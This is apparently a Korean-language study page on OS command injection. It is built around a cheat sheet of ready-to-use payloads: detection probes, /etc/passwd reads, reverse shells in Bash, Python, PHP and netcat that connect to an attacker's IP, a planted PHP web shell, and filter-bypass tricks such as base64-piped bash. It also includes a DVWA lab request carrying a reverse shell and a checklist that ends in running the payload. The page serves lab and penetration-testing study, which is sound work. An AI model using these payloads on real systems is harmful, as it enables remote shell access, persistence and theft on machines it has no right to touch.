---
sidebar_position: 2
title: Command Injection
---

# 커맨드 인젝션

## 개념

**커맨드 인젝션**: 웹 애플리케이션이 OS 명령어를 실행할 때, 악의적인 명령어를 삽입하여 실행시키는 공격

### 공격 예시
```bash
# 원래 의도: ping 192.168.1.1
# 공격: ping 192.168.1.1; whoami
```

## 명령어 연산자

### Linux/Unix

```bash
# 순차 실행 (;)
command1; command2

# AND 조건 (&&)
command1 && command2  # command1 성공 시 command2 실행

# OR 조건 (||)
command1 || command2  # command1 실패 시 command2 실행

# 파이프 (|)
command1 | command2

# 백그라운드 실행 (&)
command1 & command2

# 명령 대체 (`)
`command`

# 명령 대체 ($())
$(command)
```

### Windows

```bash
# 순차 실행 (&)
command1 & command2

# AND 조건 (&&)
command1 && command2

# OR 조건 (||)
command1 || command2

# 파이프 (|)
command1 | command2
```

## URL 인코딩

HTTP GET 요청에서는 URL 인코딩 필수:

```bash
# 원본
192.168.1.1 && whoami

# URL 인코딩
192.168.1.1%20%26%26%20whoami
```

**주요 문자 인코딩:**
- 공백: `%20` 또는 `+`
- `&`: `%26`
- `;`: `%3B`
- `|`: `%7C`
- `>`: `%3E`
- `<`: `%3C`

**Burp Suite에서 자동 인코딩:**
- 텍스트 선택 → `Ctrl+U`

## 기본 탐지

### 간단한 명령어

```bash
# ID 확인
; id
&& id
| id

# 현재 사용자
; whoami
&& whoami

# 현재 디렉토리
; pwd
&& pwd

# 파일 목록
; ls
&& ls -la
```

### 시간 기반 탐지

```bash
# Sleep 명령어
; sleep 10
&& ping -c 10 127.0.0.1  # Linux
&& timeout 10  # Windows
```

## 페이로드 예시

### 정보 수집

```bash
# 시스템 정보
; uname -a
&& cat /etc/os-release

# 네트워크 정보
; ifconfig
&& ip addr

# 사용자 정보
; cat /etc/passwd
&& whoami

# 프로세스 확인
; ps aux
&& ps -ef
```

### 리버스 쉘

#### Bash

```bash
# 기본 Bash 리버스 쉘
; bash -i >& /dev/tcp/<your-ip>/<port> 0>&1

# URL 인코딩
%3B+bash+-i+>%26+/dev/tcp/<your-ip>/<port>+0>%261
```

#### Python

```bash
# Python 리버스 쉘
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### PHP

```bash
# PHP 리버스 쉘
; php -r '$sock=fsockopen("<your-ip>",<port>);exec("sh <&3 >&3 2>&3");'

# URL 인코딩 예시
%3Bphp+-r+'$sock%3Dfsockopen("10.8.0.2",8443)%3Bexec("sh+<%263+>%263+2>%263")%3B'
```

#### Netcat

```bash
# Netcat 리버스 쉘
; nc <your-ip> <port> -e /bin/sh

# mkfifo 사용
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your-ip> <port> >/tmp/f
```

### 웹 쉘 생성

```bash
# PHP 웹 쉘 생성
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# 권한 설정
&& chmod 777 /var/www/html/shell.php
```

## 실습 예시

### DVWA Command Injection

```bash
# 1. Burp Suite로 요청 가로채기
# 2. IP 파라미터 수정

# 원본 요청
ip=127.0.0.1&Submit=Submit

# 커맨드 인젝션 (whoami)
ip=127.0.0.1%3Bwhoami&Submit=Submit

# PHP 리버스 쉘
ip=127.0.0.1%3Bphp+-r+'$sock%3Dfsockopen("10.8.0.2",8443)%3Bexec("sh+<%263+>%263+2>%263")%3B'&Submit=Submit
```

### 에러 메시지 확인

Burp Suite에서 stderr 포함하여 확인:

```bash
# stderr를 stdout으로 리다이렉트
; command 2>&1
```

## 우회 기법

### 명령어 난독화

```bash
# 따옴표 사용
w"h"o"a"m"i"

# 변수 사용
a=who;b=ami;$a$b

# Base64 인코딩
echo d2hvYW1p | base64 -d | bash
```

### 공백 우회

```bash
# Tab 사용
command1;{tab}command2

# ${IFS} 사용
command1;${IFS}command2

# Brace expansion
{cat,/etc/passwd}
```

### 블랙리스트 우회

```bash
# cat → c''at
c''at /etc/passwd

# cat → ca\t
ca\t /etc/passwd

# cat → c$@at
c$@at /etc/passwd
```

## 자동화 도구

### Commix

```bash
# Commix 설치
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py

# 사용
python3 commix.py --url="http://<target>/page.php?param=value"
```

## 주요 명령어 요약

```bash
# 기본 탐지
; whoami
&& id
| pwd

# Bash 리버스 쉘
; bash -i >& /dev/tcp/<ip>/<port> 0>&1

# Python 리버스 쉘
; python3 -c 'import socket...'

# PHP 리버스 쉘
; php -r '$sock=fsockopen("<ip>",<port>);exec("sh <&3 >&3 2>&3");'

# Netcat 리버스 쉘
; nc <ip> <port> -e /bin/sh

# URL 인코딩 (Burp Suite)
Ctrl+U
```

## 실무 체크리스트

- [ ] 대상 OS 확인 (Linux/Windows)
- [ ] 사용 가능한 명령어 연산자 확인
- [ ] 사용 가능한 인터프리터 확인 (Python, PHP, etc.)
- [ ] 방화벽/필터 우회 방법 테스트
- [ ] URL 인코딩 적용
- [ ] 리버스 쉘 리스너 준비
- [ ] 페이로드 실행 및 확인
